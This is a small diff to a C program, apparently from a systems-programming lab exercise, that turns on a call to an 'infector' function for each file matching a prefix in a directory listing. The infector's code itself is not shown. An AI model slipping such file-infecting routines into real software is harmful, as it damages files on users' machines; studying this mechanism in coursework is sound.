@@ -83,7 +83,7 @@ int main(int argc, char *argv[], char *envp[]) {
                 system_call(SYS_WRITE, 1, "\n", 1);
                 
                 /* Optional for Task 2.C: Infect the matching file */
-                /* infector(d_name); */
+                infector(d_name);
             }
         } else {
             /* No prefix provided, print every file */
